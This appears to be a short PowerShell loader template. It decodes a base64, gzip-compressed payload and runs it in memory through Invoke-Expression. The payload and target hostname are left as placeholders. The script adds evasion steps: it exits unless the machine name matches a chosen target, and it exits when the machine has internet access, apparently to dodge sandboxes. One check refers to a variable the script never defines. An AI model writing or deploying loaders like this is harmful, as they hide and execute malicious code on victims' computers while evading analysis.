# If this string has vule command:
#echo '' | base64 -d  

# doesn't work, use this script! 

$Decoded = [System.Convert]::FromBase64String("=") # add hash value 
Start-Sleep -Seconds 5
if($env:computername -eq "") {exit} # add computername
if (test-connection 8.8.8.8 -Quiet) {exit}
if ($owned[2].ToString() -ne 'if($env:computername -eq "") {exit}') {exit} Else {$ms = (New-Object System.IO.MemoryStream($Decoded,0,$Decoded.Length))} #add computername
(New-Object System.IO.StreamReader(New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress))).readtoend() | iex

Start-Sleep -Seconds 90

$Decoded = [System.Convert]::FromBase64String("=") # add hash vaule
$ms = (New-Object System.IO.MemoryStream($Decoded,0,$Decoded.Length))
(New-Object System.IO.StreamReader(New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress))).readtoend()